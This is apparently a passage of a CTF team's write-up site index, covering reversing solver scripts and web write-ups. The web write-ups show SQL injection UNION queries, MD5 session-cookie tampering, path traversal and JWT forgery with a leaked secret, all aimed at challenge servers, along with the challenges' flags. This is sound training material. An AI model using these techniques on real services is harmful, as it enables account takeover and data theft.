transpose=[11,18,15,19,8,17,5,2,12,6,21,0,22,7,13,14,4,16,20,1,3,10,9] for i in range(len(transpose)): ret[transpose[i]]=string[i] return ''.join(ret) for i in range(3): s=unxor(s) print(s) s=untranspose(s) print(s) Output 5eg2~x\\3upwc7gau\\\\gjo3i cj3o\\\\pg~i35uaug\\xe2gw7 gk0n^]sgm04watc]zf0fw4 40gf]sma^4wgtc0z]knf0w 01dg_rna_0tf}tb4{_hlg0t flag{n0t_t00_b4d_r1ght}","title":"APLab:English"},{"location":"reversing/HSCTF7/APLabEnglish/#aplabenglish","text":"","title":"APLab:English"},{"location":"reversing/HSCTF7/APLabEnglish/#description","text":"Another java Reversing Challenge. We are given a java file which is to be reversed.","title":"Description"},{"location":"reversing/HSCTF7/APLabEnglish/#solution","text":"s=\"1dd3|y_3tttb5g\\`q]^dhn3j\" def unxor(string): ret='' xorstr=[4,1,3,1,2,1,3,0,1,4,3,1,2,0,1,4,1,2,3,2,1,0,3] for i in range(len(string)): ret+=chr(ord(string[i])^xorstr[i]) return ret def untranspose(string): ret=[None]\\*23 transpose=[11,18,15,19,8,17,5,2,12,6,21,0,22,7,13,14,4,16,20,1,3,10,9] for i in range(len(transpose)): ret[transpose[i]]=string[i] return ''.join(ret) for i in range(3): s=unxor(s) print(s) s=untranspose(s) print(s)","title":"Solution"},{"location":"reversing/HSCTF7/APLabEnglish/#output","text":"5eg2~x\\3upwc7gau\\\\gjo3i cj3o\\\\pg~i35uaug\\xe2gw7 gk0n^]sgm04watc]zf0fw4 40gf]sma^4wgtc0z]knf0w 01dg_rna_0tf}tb4{_hlg0t flag{n0t_t00_b4d_r1ght}","title":"Output"},{"location":"reversing/HSCTF7/ComputerScience/","text":"APLab:Computer Science principle HSCTF Description A java RE challenge from HSCTF 2020 The challenge gives a simple java code ,which basically takes in an input of length 18, if (inp.length()!=18) { System.out.println(\"Your input is incorrect.\"); System.exit(0) } Convert it to a string through different functions inp=shift2(shift(inp)); where shift2(): public static String shift2(String input) { String ret = \"\"; for (int i = 0; i<input.length(); i++) { ret+=(char)(input.charAt(i)+ Integer.toString((int)input.charAt(i)).length()); } System.out.println(ret); return ret; } Shift(): public static String shift(String input) { String ret = \"\"; for (int i = 0; i<input.length(); i++) { ret+=(char)(input.charAt(i)-i); } System.out.println(ret); return ret; } and checks if inp is the string given.: if (inp.equals(\"inagzgkpm)Wl&Tg&io\")) { System.out.println(\"Correct. Your input is the flag.\"); } else { System.out.println(\"Your input is incorrect.\"); } So all the program needed was to reverse it to get the input they are asking for Hence import java.util.Scanner; public class ComputerSciencePrinciples { public static void main(String[] args) { Scanner sc = new Scanner(System.in); String inp = sc.nextLine(); if (inp.length()!=18) { System.out.println(\"Your input is incorrect.\"); System.exit(0); } String x=shift2(inp); String y=shift(x); System.out.println(inp); } public static String shift(String input) { String ret = \"\"; for (int i = 0; i<input.length(); i++) { ret+=(char)(input.charAt(i)+i); } System.out.println(ret); return ret; } public static String shift2(String input) { String ret = \"\"; for (int i = 0; i<input.length(); i++) { ret+=(char)(input.charAt(i)-Integer.toString((int)input.charAt(i)).length()); } System.out.println(ret); return ret; } } Where if input is given as:\"inagzgkpm)Wl&Tg&io\" Give: flag{intr0_t0_r3v}","title":"ComputerScience"},{"location":"reversing/HSCTF7/ComputerScience/#aplabcomputer-science-principle-hsctf","text":"","title":"APLab:Computer Science principle HSCTF"},{"location":"reversing/HSCTF7/ComputerScience/#description","text":"A java RE challenge from HSCTF 2020 The challenge gives a simple java code ,which basically takes in an input of length 18, if (inp.length()!=18) { System.out.println(\"Your input is incorrect.\"); System.exit(0) } Convert it to a string through different functions inp=shift2(shift(inp)); where shift2(): public static String shift2(String input) { String ret = \"\"; for (int i = 0; i<input.length(); i++) { ret+=(char)(input.charAt(i)+ Integer.toString((int)input.charAt(i)).length()); } System.out.println(ret); return ret; } Shift(): public static String shift(String input) { String ret = \"\"; for (int i = 0; i<input.length(); i++) { ret+=(char)(input.charAt(i)-i); } System.out.println(ret); return ret; } and checks if inp is the string given.: if (inp.equals(\"inagzgkpm)Wl&Tg&io\")) { System.out.println(\"Correct. Your input is the flag.\"); } else { System.out.println(\"Your input is incorrect.\"); } So all the program needed was to reverse it to get the input they are asking for Hence import java.util.Scanner; public class ComputerSciencePrinciples { public static void main(String[] args) { Scanner sc = new Scanner(System.in); String inp = sc.nextLine(); if (inp.length()!=18) { System.out.println(\"Your input is incorrect.\"); System.exit(0); } String x=shift2(inp); String y=shift(x); System.out.println(inp); } public static String shift(String input) { String ret = \"\"; for (int i = 0; i<input.length(); i++) { ret+=(char)(input.charAt(i)+i); } System.out.println(ret); return ret; } public static String shift2(String input) { String ret = \"\"; for (int i = 0; i<input.length(); i++) { ret+=(char)(input.charAt(i)-Integer.toString((int)input.charAt(i)).length()); } System.out.println(ret); return ret; } } Where if input is given as:\"inagzgkpm)Wl&Tg&io\" Give: flag{intr0_t0_r3v}","title":"Description"},{"location":"reversing/HSCTF7/Dis/","text":"Dis HSCTF2020 Description The challenge was a python bytecode challenge where the approach I chose was to maually replicate the bytecode from the documentation of the dis module in python which took up a while. Im not sure if there's a less time consuming approach but once that was done the reversing part was automated using Z3. Solution bytestring=b'\\xae\\xc0\\xa1\\xab\\xef\\x15\\xd8\\xca\\x18\\xc6\\xab\\x17\\x93\\xa8\\x11\\xd7\\x18\\x15\\xd7\\x17\\xbd\\x9a\\xc0\\xe9\\x93\\x11\\xa7\\x04\\xa1\\x1c\\x1c\\xed' from z3 import * def a(s): o = [0] * 32 for i in range(32): o[i] = ((s[i]+s[i])-60) return o def b(s,t): for x,y in zip(s,t): yield(x+y)-50 def c(s): return [x+5 for x in s] def e(s): s = [ i for i in s ] o = [ (o^5)-30 for o in b(a(s),c(s)) ] return o def main(): sol=Solver() o=b'\\xae\\xc0\\xa1\\xab\\xef\\x15\\xd8\\xca\\x18\\xc6\\xab\\x17\\x93\\xa8\\x11\\xd7\\x18\\x15\\xd7\\x17\\xbd\\x9a\\xc0\\xe9\\x93\\x11\\xa7\\x04\\xa1\\x1c\\x1c\\xed' l=list(o) s = [ BitVec('s[%s]' % i, 8) for i in range(32) ] s = e(s) for i in range(len(l)): sol.add(s[i]==l[i]) print(sol.check()) print(sol.model()) main() Flag: flag{5tr4ng3_d1s45s3mbly_1c0a88}","title":"Dis HSCTF2020"},{"location":"reversing/HSCTF7/Dis/#dis-hsctf2020","text":"","title":"Dis HSCTF2020"},{"location":"reversing/HSCTF7/Dis/#description","text":"The challenge was a python bytecode challenge where the approach I chose was to maually replicate the bytecode from the documentation of the dis module in python which took up a while. Im not sure if there's a less time consuming approach but once that was done the reversing part was automated using Z3.","title":"Description"},{"location":"reversing/HSCTF7/Dis/#solution","text":"bytestring=b'\\xae\\xc0\\xa1\\xab\\xef\\x15\\xd8\\xca\\x18\\xc6\\xab\\x17\\x93\\xa8\\x11\\xd7\\x18\\x15\\xd7\\x17\\xbd\\x9a\\xc0\\xe9\\x93\\x11\\xa7\\x04\\xa1\\x1c\\x1c\\xed' from z3 import * def a(s): o = [0] * 32 for i in range(32): o[i] = ((s[i]+s[i])-60) return o def b(s,t): for x,y in zip(s,t): yield(x+y)-50 def c(s): return [x+5 for x in s] def e(s): s = [ i for i in s ] o = [ (o^5)-30 for o in b(a(s),c(s)) ] return o def main(): sol=Solver() o=b'\\xae\\xc0\\xa1\\xab\\xef\\x15\\xd8\\xca\\x18\\xc6\\xab\\x17\\x93\\xa8\\x11\\xd7\\x18\\x15\\xd7\\x17\\xbd\\x9a\\xc0\\xe9\\x93\\x11\\xa7\\x04\\xa1\\x1c\\x1c\\xed' l=list(o) s = [ BitVec('s[%s]' % i, 8) for i in range(32) ] s = e(s) for i in range(len(l)): sol.add(s[i]==l[i]) print(sol.check()) print(sol.model()) main() Flag: flag{5tr4ng3_d1s45s3mbly_1c0a88}","title":"Solution"},{"location":"reversing/HSCTF7/Statistics/","text":"APLab:Statistics HSCTF Description A fun Java RE challenge from HSCTF-2020 The given file was a .class file which had to be converted to a .java file using any online converters or tools like jadx.Once you get the .java file I was initially not able to convert the java code due to an invoke to call a direct java bytecode for which I simply changed the line to an equivalent funtion that is simply toString to fix that. Thereafter we figured that the code was performing certain manipulations on the input and would simply check between the two strings. But the catch was where there was a sortof non reversible bubble sort kind of algorithm which picked up the two smallest values in the string and pushed them to the end of the string. And due to that a few charecters of the flag had to be guessed. However the following is the script that we used to solve the challenge. Solution import java.util.Scanner; public class statistics { public static void main(final String[] args) { int[] arr = {102,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}; // checkstring=\"qtqnhuyj{fjw{rwhswzppfnfrz|qndfktceyba\" String com = \"fqntqdhuyj{fjw{rwhswzppfnbrz|qncfktaey\"; String guess = \"abcdefghijklmnopqrstuvwxyz{_}|\"; System.out.print(\"f\"); for (int i = 1 ; i<com.length() ; i ++){ char st = com.charAt(i); for (int k = 0;k< guess.length();k++){ if (arr[i - 1] % 2 == 0) { arr[i] = guess.charAt(k) + (arr[i - 1] - 97); } else { arr[i] = guess.charAt(k) - (arr[i - 1] - 97); } arr[i] = (arr[i] - 97 + 29)%29 + 97; if((char)arr[i] == st){ System.out.print(guess.charAt(k)); break; } //System.out.println((char)arr[i]); }} } } Output: flag{tenpercentofallstatirqicsashfake} We had to perform several tries to finally guess the few last charecters we needed to complete the flag. But it was worth! Flag: flag{tenpercentofallstatitoicsarefake}","title":"APLab:Statistics HSCTF"},{"location":"reversing/HSCTF7/Statistics/#aplabstatistics-hsctf","text":"","title":"APLab:Statistics HSCTF"},{"location":"reversing/HSCTF7/Statistics/#description","text":"A fun Java RE challenge from HSCTF-2020 The given file was a .class file which had to be converted to a .java file using any online converters or tools like jadx.Once you get the .java file I was initially not able to convert the java code due to an invoke to call a direct java bytecode for which I simply changed the line to an equivalent funtion that is simply toString to fix that. Thereafter we figured that the code was performing certain manipulations on the input and would simply check between the two strings. But the catch was where there was a sortof non reversible bubble sort kind of algorithm which picked up the two smallest values in the string and pushed them to the end of the string. And due to that a few charecters of the flag had to be guessed. However the following is the script that we used to solve the challenge.","title":"Description"},{"location":"reversing/HSCTF7/Statistics/#solution","text":"import java.util.Scanner; public class statistics { public static void main(final String[] args) { int[] arr = {102,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}; // checkstring=\"qtqnhuyj{fjw{rwhswzppfnfrz|qndfktceyba\" String com = \"fqntqdhuyj{fjw{rwhswzppfnbrz|qncfktaey\"; String guess = \"abcdefghijklmnopqrstuvwxyz{_}|\"; System.out.print(\"f\"); for (int i = 1 ; i<com.length() ; i ++){ char st = com.charAt(i); for (int k = 0;k< guess.length();k++){ if (arr[i - 1] % 2 == 0) { arr[i] = guess.charAt(k) + (arr[i - 1] - 97); } else { arr[i] = guess.charAt(k) - (arr[i - 1] - 97); } arr[i] = (arr[i] - 97 + 29)%29 + 97; if((char)arr[i] == st){ System.out.print(guess.charAt(k)); break; } //System.out.println((char)arr[i]); }} } } Output: flag{tenpercentofallstatirqicsashfake} We had to perform several tries to finally guess the few last charecters we needed to complete the flag. But it was worth! Flag: flag{tenpercentofallstatitoicsarefake}","title":"Solution"},{"location":"reversing/tamuCTF/astronomy/","text":"setecAstronomy Reverse the operations given. def xx(a, b): l=[] for i in range(len(a)): l.append(str(int(a[i])^int(b[i]))) return l out = \"11001010011011101100110001011000111110101010111000001100011101101111100001111010001000100110000011100100100110001110000001111101\" phoenix = list(out) ph = phoenix[::-1] abbott = ph[0:32] cosmo = ph[32:64] ayk0 = ph[64:96] earl = ph[96:128] ayk64 = xx(earl,ayk0) ayk96 = xx(cosmo,ayk64) ayk32 = xx(abbott,ayk96) ayk = ayk0 + ayk32 + ayk64 + ayk96 ayk[95:99], ayk[81:85] = ayk[81:85], ayk[95:99] ayk[63:71], ayk[120:128] = ayk[120:128], ayk[63:71] ayk[54:62], ayk[32:40] = ayk[32:40], ayk[54:62] ayk[3:7], ayk[19:23] = ayk[19:23], ayk[3:7] in0 = ayk[0:32] dave = ayk[32:64] red = ayk[64:96] king = ayk[96:128] in96 = xx(red, in0) in64 = xx(dave, in96) in32 = xx(king, in64) final = in0 + in32 + in64 + in96 print(\"\".join(final)) Output string: 01110100001100000110111101011111010011010011010001101110010110010101111101110011001100110110001101010010001100110111010001010011 Decoding it gives t0o_M4nY_s3cR3tS Flag: gigem{t0o_M4nY_s3cR3tS}","title":"Astronomy"},{"location":"reversing/tamuCTF/astronomy/#setecastronomy","text":"Reverse the operations given. def xx(a, b): l=[] for i in range(len(a)): l.append(str(int(a[i])^int(b[i]))) return l out = \"11001010011011101100110001011000111110101010111000001100011101101111100001111010001000100110000011100100100110001110000001111101\" phoenix = list(out) ph = phoenix[::-1] abbott = ph[0:32] cosmo = ph[32:64] ayk0 = ph[64:96] earl = ph[96:128] ayk64 = xx(earl,ayk0) ayk96 = xx(cosmo,ayk64) ayk32 = xx(abbott,ayk96) ayk = ayk0 + ayk32 + ayk64 + ayk96 ayk[95:99], ayk[81:85] = ayk[81:85], ayk[95:99] ayk[63:71], ayk[120:128] = ayk[120:128], ayk[63:71] ayk[54:62], ayk[32:40] = ayk[32:40], ayk[54:62] ayk[3:7], ayk[19:23] = ayk[19:23], ayk[3:7] in0 = ayk[0:32] dave = ayk[32:64] red = ayk[64:96] king = ayk[96:128] in96 = xx(red, in0) in64 = xx(dave, in96) in32 = xx(king, in64) final = in0 + in32 + in64 + in96 print(\"\".join(final)) Output string: 01110100001100000110111101011111010011010011010001101110010110010101111101110011001100110110001101010010001100110111010001010011 Decoding it gives t0o_M4nY_s3cR3tS Flag: gigem{t0o_M4nY_s3cR3tS}","title":"setecAstronomy"},{"location":"reversing/tamuCTF/cipher/","text":"Simple_cipher points : 150 Description: We have a flag encrypted using this program. Can you figure out what it is? Writeup The challenge is basically a xoring challenge where random numbers gets xored with the input to form the encrypted key provided in the file named flag.enc Going through the debuggers , we can see that there is a call of :srand(0x1337) The srand() function sets the starting point for for the production of random numbers . It also got two xoring operations .Hence xoring with the random numbers and the data from the flag.enc to get the flag Solution Script import random from ctypes import CDLL libc = CDLL(\"libc.so.6\") libc.srand(0x1337) f=open('flag.enc','rb') X=[] while(True): c=f.read(1) if not c: break b = int.from_bytes(c, byteorder='big') M=hex(b^libc.rand()^libc.rand()).strip()[-2:] X.append(chr(int(M,16))) print(''.join(X)) Flag:gigem{d0n7_wr173_y0ur_0wn_c1ph3r5}","title":"Simple_cipher"},{"location":"reversing/tamuCTF/cipher/#simple_cipher","text":"","title":"Simple_cipher"},{"location":"reversing/tamuCTF/cipher/#points-150","text":"","title":"points : 150"},{"location":"reversing/tamuCTF/cipher/#description","text":"We have a flag encrypted using this program. Can you figure out what it is?","title":"Description:"},{"location":"reversing/tamuCTF/cipher/#writeup","text":"The challenge is basically a xoring challenge where random numbers gets xored with the input to form the encrypted key provided in the file named flag.enc Going through the debuggers , we can see that there is a call of :srand(0x1337) The srand() function sets the starting point for for the production of random numbers . It also got two xoring operations .Hence xoring with the random numbers and the data from the flag.enc to get the flag","title":"Writeup"},{"location":"reversing/tamuCTF/cipher/#solution-script","text":"import random from ctypes import CDLL libc = CDLL(\"libc.so.6\") libc.srand(0x1337) f=open('flag.enc','rb') X=[] while(True): c=f.read(1) if not c: break b = int.from_bytes(c, byteorder='big') M=hex(b^libc.rand()^libc.rand()).strip()[-2:] X.append(chr(int(M,16))) print(''.join(X)) Flag:gigem{d0n7_wr173_y0ur_0wn_c1ph3r5}","title":"Solution Script"},{"location":"web/intro/","text":"Web Exploitaion Introduction \"Write about Web Exploitation and about the writeups\" The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. Dawg CTF 2020 FreeWifi 2 BlueHens CTF 2021 speedrun-1 - Sivakami Praveen speedrun-2 - Sivakami Praveen Speedrun- 3 - Aiswarya Nair beautiful TAMUctf 2021 uphpload - Sivakami Praveen API 2 : The SeQueL - Aiswarya Nair & Srividhya Vasanth","title":"Web Exploitaion"},{"location":"web/intro/#web-exploitaion","text":"","title":"Web Exploitaion"},{"location":"web/intro/#introduction","text":"\"Write about Web Exploitation and about the writeups\"","title":"Introduction"},{"location":"web/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. Dawg CTF 2020 FreeWifi 2 BlueHens CTF 2021 speedrun-1 - Sivakami Praveen speedrun-2 - Sivakami Praveen Speedrun- 3 - Aiswarya Nair beautiful TAMUctf 2021 uphpload - Sivakami Praveen API 2 : The SeQueL - Aiswarya Nair & Srividhya Vasanth","title":"The contents of this repo"},{"location":"web/BlueHensCTF2021/ctfvc/","text":"BlueHens CTF CTFVC - Web When we first visit the url we see a PHP code written It is passing a file as a query parameter and might be a directory traveral attack.So this must be an exposed git repository attack. Using https://github.com/internetwache/GitTools Dumper and Extractor scripts we can extract the one commit, and looking at the metadata we are not given access to the directory \"1a2220dd8c13c32e\" in the version control system. VC stands for version control On passing this in the url ?file=/1a2220dd8c13c32e/flag.txt we get the flag UDCTF{h4h4_suck3rs_i_t0tally_l0ck3d_th1s_down}","title":"BlueHens CTF"},{"location":"web/BlueHensCTF2021/ctfvc/#bluehens-ctf","text":"","title":"BlueHens CTF"},{"location":"web/BlueHensCTF2021/ctfvc/#ctfvc-web","text":"When we first visit the url we see a PHP code written It is passing a file as a query parameter and might be a directory traveral attack.So this must be an exposed git repository attack. Using https://github.com/internetwache/GitTools Dumper and Extractor scripts we can extract the one commit, and looking at the metadata we are not given access to the directory \"1a2220dd8c13c32e\" in the version control system. VC stands for version control On passing this in the url ?file=/1a2220dd8c13c32e/flag.txt we get the flag UDCTF{h4h4_suck3rs_i_t0tally_l0ck3d_th1s_down}","title":"CTFVC - Web"},{"location":"web/BlueHensCTF2021/speedrun-1/sp1/","text":"speedrun-1 Description Solution When we visit the url we find this static page that just says hello User 2 We notice there is a session cookie. PHPSESSID is generally produced using MD5. c81e728d9d4c2f636f067f89cc14862c is the MD5 hash of 2 . Let's try changing the value. MD5(1) = c4ca4238a0b923820dcc509a6f75849b This gave us the flag:","title":"speedrun-1"},{"location":"web/BlueHensCTF2021/speedrun-1/sp1/#speedrun-1","text":"","title":"speedrun-1"},{"location":"web/BlueHensCTF2021/speedrun-1/sp1/#description","text":"","title":"Description"},{"location":"web/BlueHensCTF2021/speedrun-1/sp1/#solution","text":"When we visit the url we find this static page that just says hello User 2 We notice there is a session cookie. PHPSESSID is generally produced using MD5. c81e728d9d4c2f636f067f89cc14862c is the MD5 hash of 2 . Let's try changing the value. MD5(1) = c4ca4238a0b923820dcc509a6f75849b This gave us the flag:","title":"Solution"},{"location":"web/BlueHensCTF2021/speedrun-2/sp2/","text":"speedrun-2 Description Solution Looking at the script it is obvious this is an SQLi. The course table does not seem to contain any values useful to us. Let's try searching for other tables: http://challenges.ctfd.io:30026/?credits=1+union+select+1,2,3,tbl_name+FROM+sqlite_master We notice there is table flag_xor_shares that looks interesting. Lets try viewing the structure of the table: http://challenges.ctfd.io:30026/?credits=1+union+select+1,2,3,sql+FROM+sqlite_master+where+name=%27flag_xor_shares%27 http://challenges.ctfd.io:30026/?credits=1+union+select+id,hexdigest,3,4+from+flag_xor_shares The contents of the table are secret shares. XORing them together should give us the flag. I wrote a quick script for this from pwn import xor KEY1 = bytes.fromhex(\"7419ccad9d5949e66614cd9458cdac149c2ad981c9f3ec56d30d03e730631c23598394a6055c55ecb5bec49dd0043b9fde76\") KEY2 = bytes.fromhex(\"835db37484676a462e223024a365c91fcdfe53ff975852abfacb79e0f3aef8d5b897a36c6fbfde9ca8e63b3ee00d3a1830f1\") key3 = bytes.fromhex(\"9c5890b6230771372122e9352ed1f3a1f644c9d4e451b81cb2f6643a067669972dc6a06617eaf08e539ada9a92b713b09b0c\") key4 = bytes.fromhex(\"53e5553b467e4badfcee4d97262445b27cdad3ced69a7fc69e0a04196685a61052cdd2f8a7a9650a0d861707f51403ccebc3\") key5 = bytes.fromhex(\"6dbdf9003a3c710afbc92a669f248c6fbe15fc550753264477436a5093614a2efc76310bb7906c911c305a0a39f566c8fc35\") flag = xor(KEY1, KEY2, key3, key4, key5) print(flag.decode()) UDCTF{h0n3stly_we_l1k3_crypt0_a_bit_m0re_th4n_w3b}","title":"speedrun-2"},{"location":"web/BlueHensCTF2021/speedrun-2/sp2/#speedrun-2","text":"","title":"speedrun-2"},{"location":"web/BlueHensCTF2021/speedrun-2/sp2/#description","text":"","title":"Description"},{"location":"web/BlueHensCTF2021/speedrun-2/sp2/#solution","text":"Looking at the script it is obvious this is an SQLi. The course table does not seem to contain any values useful to us. Let's try searching for other tables: http://challenges.ctfd.io:30026/?credits=1+union+select+1,2,3,tbl_name+FROM+sqlite_master We notice there is table flag_xor_shares that looks interesting. Lets try viewing the structure of the table: http://challenges.ctfd.io:30026/?credits=1+union+select+1,2,3,sql+FROM+sqlite_master+where+name=%27flag_xor_shares%27 http://challenges.ctfd.io:30026/?credits=1+union+select+id,hexdigest,3,4+from+flag_xor_shares The contents of the table are secret shares. XORing them together should give us the flag. I wrote a quick script for this from pwn import xor KEY1 = bytes.fromhex(\"7419ccad9d5949e66614cd9458cdac149c2ad981c9f3ec56d30d03e730631c23598394a6055c55ecb5bec49dd0043b9fde76\") KEY2 = bytes.fromhex(\"835db37484676a462e223024a365c91fcdfe53ff975852abfacb79e0f3aef8d5b897a36c6fbfde9ca8e63b3ee00d3a1830f1\") key3 = bytes.fromhex(\"9c5890b6230771372122e9352ed1f3a1f644c9d4e451b81cb2f6643a067669972dc6a06617eaf08e539ada9a92b713b09b0c\") key4 = bytes.fromhex(\"53e5553b467e4badfcee4d97262445b27cdad3ced69a7fc69e0a04196685a61052cdd2f8a7a9650a0d861707f51403ccebc3\") key5 = bytes.fromhex(\"6dbdf9003a3c710afbc92a669f248c6fbe15fc550753264477436a5093614a2efc76310bb7906c911c305a0a39f566c8fc35\") flag = xor(KEY1, KEY2, key3, key4, key5) print(flag.decode()) UDCTF{h0n3stly_we_l1k3_crypt0_a_bit_m0re_th4n_w3b}","title":"Solution"},{"location":"web/BlueHensCTF2021/speedrun-3/speed3/","text":"Speedrun 3 Description link Solution First, we enter the site and randomly fill in the input We then refresh it and see {\"admin\":false,\"name\":\"asd\"} We also note that a cookie, named authtoken was created, with the value eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6ZmFsc2UsIm5hbWUiOiJhc2QifQ.i9II9riAxP5OSQrVDrRX2dOnNaJI_K4Vk9FED-ADuVs We play around with the cookie by deleting half of it, and was greeted with an error Fatal error: Uncaught UnexpectedValueException: Wrong number of segments in /var/www/html/index.php:84 Stack trace: #0 /var/www/html/index.php(531): Firebase\\JWT\\JWT::decode('eyJ0eXAiOiJKV1Q...', '82a59879a507', Array) #1 {main} thrown in /var/www/html/index.php on line 84 JWT When we google JWT decoder we get the link link We find that the format for the code is JWT::decode($payload, JWK::parseKeySet($jwks), $supportedAlgorithm); Hence, we input the 256-bit-secret as 82a59879a507 Now, it is verified Getting the flag We use the tool to change admin to true, and get eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZSwibmFtZSI6ImFzZCJ9.YTbnlIIllCx5UyHp4N-M1f00hDl5erOGmq2V17N8RKg Flag is: UDCTF{st00p1d_PHP_err0r_mess4ges}","title":"Speedrun 3"},{"location":"web/BlueHensCTF2021/speedrun-3/speed3/#speedrun-3","text":"","title":"Speedrun 3"},{"location":"web/BlueHensCTF2021/speedrun-3/speed3/#description","text":"link","title":"Description"},{"location":"web/BlueHensCTF2021/speedrun-3/speed3/#solution","text":"First, we enter the site and randomly fill in the input We then refresh it and see {\"admin\":false,\"name\":\"asd\"} We also note that a cookie, named authtoken was created, with the value eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6ZmFsc2UsIm5hbWUiOiJhc2QifQ.i9II9riAxP5OSQrVDrRX2dOnNaJI_K4Vk9FED-ADuVs We play around with the cookie by deleting half of it, and was greeted with an error Fatal error: Uncaught UnexpectedValueException: Wrong number of segments in /var/www/html/index.php:84 Stack trace: #0 /var/www/html/index.php(531): Firebase\\JWT\\JWT::decode('eyJ0eXAiOiJKV1Q...', '82a59879a507', Array) #1 {main} thrown in /var/www/html/index.php on line 84","title":"Solution"},{"location":"web/BlueHensCTF2021/speedrun-3/speed3/#jwt","text":"When we google JWT decoder we get the link link We find that the format for the code is JWT::decode($payload, JWK::parseKeySet($jwks), $supportedAlgorithm); Hence, we input the 256-bit-secret as 82a59879a507 Now, it is verified","title":"JWT"},{"location":"web/BlueHensCTF2021/speedrun-3/speed3/#getting-the-flag","text":"We use the tool to change admin to true, and get eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZSwibmFtZSI6ImFzZCJ9.YTbnlIIllCx5UyHp4N-M1f00hDl5erOGmq2V17N8RKg","title":"Getting the flag"},{"location":"web/BlueHensCTF2021/speedrun-3/speed3/#flag-is","text":"UDCTF{st00p1d_PHP_err0r_mess4ges}","title":"Flag is:"},{"location":"web/DawgCTF20/freewifi2/","text":"FreeWifi2 There is a pcap given. On TCP Stream 48, we can find the username: true.grit@umbccd.io In addition, there are three interesting endpoints in the pcap. You can go over all the tcp streams and eventually, you find the below details: - /jwtlogin - /forgotpassword.html - /staff.html (this got a flag which is the solution for FreeWifi1.) Trying to login with username:password as true.grit@umbccd.io:true.grit@umbccd.io gives the following token in the response: < JWT 'identity'=31337 > HTTP Request: POST /staff.html HTTP/1.1 Host: freewifi.ctf.umbccd.io User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 178 Origin: https://freewifi.ctf.umbccd.io Connection: close Referer: https://freewifi.ctf.umbccd.io/staff.html Cookie: session=eyJjc3JmX3Rva2VuIjoiY2MwZjFmODY4ZWRiOTgzNTUxYzBhM2FiMzFmNDExODJiY2ViYTA5MyJ9.XpGbsA.Afj_d2U1FAfOy_LNDW-ucVcxN94; WifiKey nonce=MjAyMC0wNC0xMSAxMDozOA==; WifiKey alg=SHA1 Upgrade-Insecure-Requests: 1 csrf_token=ImNjMGYxZjg2OGVkYjk4MzU1MWMwYTNhYjMxZjQxMTgyYmNlYmEwOTMi.XpGeNA.1eSf_9aW6Z1u9djuBDm_N9KhO8M&username=true.grit%40umbccd.io&password=true.grit%40umbccd.io&submit=Submit HTTP Response: HTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Date: Sat, 11 Apr 2020 10:39:07 GMT Content-Type: text/html; charset=utf-8 Connection: close Set-Cookie: WifiKey nonce=MjAyMC0wNC0xMSAxMDozOQ==; Path=/ Set-Cookie: WifiKey alg=SHA1; Path=/ Set-Cookie: JWT 'identity'=31337; Path=/ Vary: Cookie Content-Length: 2666 Ideas: I think the goal is to login with /jwtlogin We have identity from the above request. In addition, there is additional information from the pcap about a secret: Set-Cookie: JWT 'secret'=\"dawgCTF?heckin#bamboozle\"; Path=/ Using, this two values, I tried creating a JWT token using python. import jwt print jwt.encode({'identity':31337,'exp':1614291780,'iat':1475878357,'nbf':1475878357},'dawgCTF?heckin#bamboozle',algorithm='HS256') eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA Below is the request that gave me the flag: HTTP Request GET /jwtlogin HTTP/1.1 Host: freewifi.ctf.umbccd.io User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Authorization: JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA Connection: keep-alive Upgrade-Insecure-Requests: 1 Content-Length: 2 You have the flag in the reponse. DawgCTF{y0u_d0wn_w!t#_JWT?}","title":"Freewifi2"},{"location":"web/DawgCTF20/freewifi2/#freewifi2","text":"There is a pcap given. On TCP Stream 48, we can find the username: true.grit@umbccd.io In addition, there are three interesting endpoints in the pcap. You can go over all the tcp streams and eventually, you find the below details: - /jwtlogin - /forgotpassword.html - /staff.html (this got a flag which is the solution for FreeWifi1.) Trying to login with username:password as true.grit@umbccd.io:true.grit@umbccd.io gives the following token in the response: < JWT 'identity'=31337 > HTTP Request: POST /staff.html HTTP/1.1 Host: freewifi.ctf.umbccd.io User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 178 Origin: https://freewifi.ctf.umbccd.io Connection: close Referer: https://freewifi.ctf.umbccd.io/staff.html Cookie: 